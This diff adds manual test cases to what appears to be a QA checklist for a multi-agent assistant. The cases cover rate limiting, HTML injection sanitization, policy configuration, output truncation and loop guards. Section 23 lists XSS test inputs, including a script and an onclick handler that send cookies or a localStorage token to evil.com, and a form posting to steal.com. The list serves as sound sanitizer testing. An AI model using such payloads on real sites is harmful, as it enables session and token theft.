@@ -312,6 +312,294 @@ Add a task to email tyler.parks@wipro.com with my project link by Friday
 You are now my reminder: tell me what I have due this week
 
 
+-------------------------------------------------------------
+22. SECURITY AGENT — Rate Limiting (hard block after 10 req/min)
+    Expected: 11th message within 60s returns:
+    "You're sending messages too quickly. Please wait a moment."
+    Default limit: 10 requests per minute per user.
+-------------------------------------------------------------
+
+[Send these 11 messages back-to-back as fast as possible]
+
+Message 1:  what is AI
+Message 2:  what is ML
+Message 3:  what is NLP
+Message 4:  what is a neural network
+Message 5:  what is deep learning
+Message 6:  what is reinforcement learning
+Message 7:  what is a transformer
+Message 8:  what is an LLM
+Message 9:  what is RAG
+Message 10: what is an agent
+Message 11: what is a multi-agent system
+→ Message 11 should be blocked with the rate limit message.
+
+[Terminal shortcut — send 11 quick requests via CLI to trigger it faster]
+for i in $(seq 1 11); do python3 -m app.main ask "what is AI request $i"; done
+
+
+-------------------------------------------------------------
+23. SECURITY AGENT — HTML / Script Injection Sanitization
+    Expected: dangerous tags stripped, assistant answers the clean question normally.
+    The script/iframe/etc. never reaches the LLM — only the text around it does.
+-------------------------------------------------------------
+
+Basic script tag (stripped, then answers "what is AI?"):
+Hello <script>alert('xss')</script> what is AI?
+
+Iframe embed:
+<iframe src="https://evil.com/steal"></iframe> tell me about machine learning
+
+Object tag:
+<object data="malicious.swf"></object> what is Python?
+
+Form with action:
+<form action="http://steal.com/post" method="POST">inputs here</form> what is RAG?
+
+onclick event handler:
+Click <a onclick="document.location='http://evil.com?c='+document.cookie">here</a> to learn about LLMs
+
+javascript: URL:
+Visit <a href="javascript:void(document.cookie)">this link</a> and tell me about agents
+
+Combined attack — script + onclick:
+<script>fetch('http://evil.com?key='+localStorage.getItem('token'))</script> <button onclick="steal()">click</button> what is an orchestrator?
+
+Entity-encoded attack (&#60; = <, &#62; = >):
+&#60;script&#62;alert(document.cookie)&#60;/script&#62; what is a vector database?
+
+Mixed encoding — hex entities:
+&#x3C;script&#x3E;eval(atob('YWxlcnQoMSk='))&#x3C;/script&#x3E; what is ChromaDB?
+
+[After each: DB should show event_type="html_injection"]
+sqlite3 data/sqlite/registry.db "SELECT event_type, severity, snippet FROM security_events WHERE event_type='html_injection' ORDER BY created_at DESC LIMIT 5;"
+
+
+-------------------------------------------------------------
+24. SECURITY AGENT — SecurityPolicy config (demo queries)
+    These are terminal commands to show the policy is declarative and inspectable.
+    Run in Python REPL or python3 -c "..."
+-------------------------------------------------------------
+
+[Show default policy as JSON]
+python3 -c "
+from app.agents.security_policy import SecurityPolicy
+import json
+p = SecurityPolicy()
+print(json.dumps(p.model_dump(), indent=2))
+"
+
+[Show policy loaded from app settings]
+python3 -c "
+from app.agents.security_policy import SecurityPolicy
+from app.config.settings import get_settings
+p = SecurityPolicy.from_settings(get_settings())
+print('rate_limit_per_minute:', p.rate_limit_per_minute)
+print('max_input_length:', p.max_input_length)
+print('max_output_length:', p.max_output_length)
+print('html_sanitization_enabled:', p.html_sanitization_enabled)
+print('injection_patterns count:', len(p.injection_patterns))
+"
+
+[Show policy is fully configurable — override any field]
+python3 -c "
+from app.agents.security_policy import SecurityPolicy
+strict = SecurityPolicy(rate_limit_per_minute=3, max_input_length=500, html_sanitization_enabled=True)
+permissive = SecurityPolicy(rate_limit_enabled=False, html_sanitization_enabled=False)
+print('Strict policy:', strict.rate_limit_per_minute, 'req/min, max input:', strict.max_input_length)
+print('Permissive policy: rate_limit_enabled=', permissive.rate_limit_enabled)
+"
+
+[Show SecurityAgent accepts the policy and uses it]
+python3 -c "
+from app.agents.security_agent import SecurityAgent
+from app.agents.security_policy import SecurityPolicy
+
+policy = SecurityPolicy(rate_limit_per_minute=2, max_output_length=50)
+agent = SecurityAgent(policy=policy)
+
+# Trigger rate limit after 2 requests
+r1 = agent.check_input('hello', user_id='demo')
+r2 = agent.check_input('hello', user_id='demo')
+r3 = agent.check_input('hello', user_id='demo')  # blocked
+print('r1 blocked:', r1.blocked)
+print('r2 blocked:', r2.blocked)
+print('r3 blocked:', r3.blocked, '| reason:', r3.reason)
+
+# Trigger output truncation
+out = agent.check_output('A' * 100)
+print('Truncated output:', repr(out))
+"
+
+
+-------------------------------------------------------------
+25. SECURITY AGENT — Max Output Length (truncation)
+    Expected: very long LLM responses end with " [truncated]"
+    Default max: 8000 characters.
+-------------------------------------------------------------
+
+[Terminal test — verify truncation at the default 8000 char limit]
+python3 -c "
+from app.agents.security_agent import SecurityAgent
+from app.agents.security_policy import SecurityPolicy
+
+agent = SecurityAgent(policy=SecurityPolicy(max_output_length=100, rate_limit_enabled=False))
+long_output = 'This is a very long response. ' * 20
+result = agent.check_output(long_output)
+print('Input length:', len(long_output))
+print('Output length:', len(result))
+print('Ends with truncated:', result.endswith('[truncated]'))
+print('Output:', repr(result))
+"
+
+[Chat query that might produce a long response — verify it comes back complete or truncated]
+Give me a very detailed explanation of how transformer neural networks work, including attention mechanisms, positional encoding, encoder-decoder architecture, multi-head attention, and the feed-forward layers
+
+
+-------------------------------------------------------------
+26. SECURITY AGENT — Full security_events audit log
+    Run this after completing sections 22–25 to see all events recorded.
+-------------------------------------------------------------
+
+[Show all recent security events grouped by type]
+sqlite3 data/sqlite/registry.db "
+SELECT event_type, severity, COUNT(*) as count
+FROM security_events
+GROUP BY event_type, severity
+ORDER BY count DESC;
+"
+
+[Show last 20 events with full detail]
+sqlite3 data/sqlite/registry.db "
+SELECT event_type, severity, snippet, created_at
+FROM security_events
+ORDER BY created_at DESC
+LIMIT 20;
+"
+
+
+-------------------------------------------------------------
+27. INFINITE LOOP PREVENTION — Max Plan Steps (cap at 5)
+    Expected: orchestrator never executes more than 5 agent steps per turn,
+    even if it tries to plan more.
+-------------------------------------------------------------
+
+[Python test — verify the cap is enforced]
+python3 -c "
+from app.agents.base import AgentStep, OrchestratorPlan
+from app.agents.runner import AgentRunner
+
+# Simulate a plan with 8 steps (more than the cap of 5)
+steps = [AgentStep(agent='conversational', task=f'step {i}') for i in range(8)]
+plan = OrchestratorPlan(steps=steps)
+
+# Apply the guard directly
+plan.steps = [s for s in plan.steps if s.agent in AgentRunner._VALID_AGENTS]
+plan.steps = plan.steps[:AgentRunner._MAX_STEPS]
+print('Steps after guard:', len(plan.steps))  # should be 5
+"
+
+[Chat query — compound query that might tempt the orchestrator into many steps]
+Search for what LangGraph is, then look up CrewAI, then find the news on AI agents,
+then save that I am studying agent frameworks, then remind me to review them this weekend,
+and also log that I read about agents today, and tell me what the weather is like
+
+
+-------------------------------------------------------------
+28. INFINITE LOOP PREVENTION — Plan Allowlist (block invalid agent names)
+    Expected: any agent name the orchestrator hallucinates is silently dropped.
+    Valid agents: rag_agent, research_agent, action_agent, conversational
+-------------------------------------------------------------
+
+[Python test — verify unknown agent names are stripped]
+python3 -c "
+from app.agents.base import AgentStep, OrchestratorPlan
+from app.agents.runner import AgentRunner
+
+# Simulate a plan where orchestrator hallucinates an agent name
+steps = [
+    AgentStep(agent='rag_agent', task='search docs'),
+    AgentStep(agent='orchestrator', task='re-plan'),   # circular — should be stripped
+    AgentStep(agent='unknown_agent', task='do thing'), # invalid — should be stripped
+    AgentStep(agent='conversational', task='answer'),
+]
+plan = OrchestratorPlan(steps=steps)
+plan.steps = [s for s in plan.steps if s.agent in AgentRunner._VALID_AGENTS]
+print('Steps after allowlist:', [s.agent for s in plan.steps])
+# Expected: ['rag_agent', 'conversational']
+"
+
+
+-------------------------------------------------------------
+29. INFINITE LOOP PREVENTION — History Truncation (cap at 20 turns)
+    Expected: only the last 20 turns of history are passed to the LLM,
+    preventing context window overflow on long sessions.
+-------------------------------------------------------------
+
+[Python test — verify history is trimmed]
+python3 -c "
+from app.agents.runner import AgentRunner
+print('MAX_HISTORY:', AgentRunner._MAX_HISTORY)  # 20
+
+# Simulate a long session
+history = [{'role': 'user' if i % 2 == 0 else 'assistant', 'content': f'message {i}'} for i in range(50)]
+print('Original history length:', len(history))
+
+# Apply the guard (same as runner.run() does)
+if len(history) > AgentRunner._MAX_HISTORY:
+    history = history[-AgentRunner._MAX_HISTORY:]
+print('Trimmed history length:', len(history))  # should be 20
+print('First message after trim:', history[0]['content'])  # should be 'message 30'
+"
+
+[Chat — stress test with a very long session]
+Start a fresh session, send 25+ messages, then ask:
+  What was the first thing I said to you in this conversation?
+Expected: Sage may not recall it (history trimmed to last 20 turns) — this is correct behaviour,
+not a bug. It prevents the LLM from getting an unbounded context.
+
+
+-------------------------------------------------------------
+30. INFINITE LOOP PREVENTION — LLM Retry with Tenacity
+    Expected: on transient failures (network error, 5xx), retries up to 3 times
+    with exponential backoff. On 4xx (bad request, auth), fails immediately (no retry).
+-------------------------------------------------------------
+
+[Python test — verify retry configuration]
+python3 -c "
+from app.providers.ollama_chat import OllamaChatProvider
+from app.providers.groq_chat import GroqChatProvider
+
+ollama = OllamaChatProvider(base_url='http://localhost:11434', model='llama3.2:3b')
+print('Ollama max_retries:', ollama._max_retries)   # 3
+print('Ollama timeout_seconds:', ollama._timeout_seconds)  # 60
+
+groq = GroqChatProvider(api_key='test', model='llama-3.3-70b-versatile')
+print('Groq max_retries:', groq._max_retries)   # 3
+print('Groq timeout_seconds:', groq._timeout_seconds)  # 60
+"
+
+[Python test — verify 5xx triggers retry, 4xx does not]
+python3 -c "
+from app.providers.ollama_embeddings import OllamaProviderError, TransientProviderError
+
+# TransientProviderError (5xx / network) IS a subclass of OllamaProviderError
+print('TransientProviderError is OllamaProviderError:', issubclass(TransientProviderError, OllamaProviderError))
+# This means: catching OllamaProviderError catches both permanent and transient errors
+# But tenacity only retries TransientProviderError — 4xx errors propagate immediately
+"
+
+[Terminal — verify settings control retry behaviour]
+python3 -c "
+from app.config.settings import get_settings
+s = get_settings()
+print('llm_max_retries:', s.llm_max_retries)         # 3
+print('llm_timeout_seconds:', s.llm_timeout_seconds) # 30
+print('max_agent_steps:', s.max_agent_steps)         # 5
+print('max_history_turns:', s.max_history_turns)     # 20
+"
+
+
 =============================================================
   QUERY PATTERNS COVERED
 =============================================================
@@ -332,4 +620,13 @@ You are now my reminder: tell me what I have due this week
   [x] Security: secret leak redaction — sk-, gsk_, AIza, Bearer, env-var
   [x] Security: length limit hard block (> 2000 chars)
   [x] Security: false positive check (legitimate inputs pass through)
+  [x] Security: rate limiting — blocks after 10 req/min per user
+  [x] Security: HTML/script injection sanitization (7 patterns + entity decode)
+  [x] Security: SecurityPolicy declarative config — inspectable, overridable
+  [x] Security: max output length — truncates at 8000 chars with [truncated]
+  [x] Security: full audit log via security_events SQLite table
+  [x] Loop guard: max 5 plan steps per turn (cap enforced after planning)
+  [x] Loop guard: agent allowlist — invalid/circular agent names stripped
+  [x] Loop guard: history truncated to last 20 turns (context overflow prevention)
+  [x] Loop guard: tenacity retries — 3x on 5xx/network, immediate fail on 4xx
 =============================================================
